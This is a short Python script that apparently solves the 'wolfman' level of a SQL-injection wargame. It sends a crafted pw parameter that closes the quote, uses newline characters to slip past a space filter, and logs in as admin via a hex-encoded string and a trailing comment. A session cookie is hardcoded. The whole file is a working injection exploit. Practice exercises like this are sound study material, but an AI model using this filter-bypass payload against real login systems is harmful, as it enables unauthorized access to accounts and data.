import requests

url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def solve():
    query = "pw=%27%0aor%0aid=0x61646d696e%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "Hello admin" in res.text:
        print("WOLFMAN Clear!")

if __name__ == "__main__":
    solve()
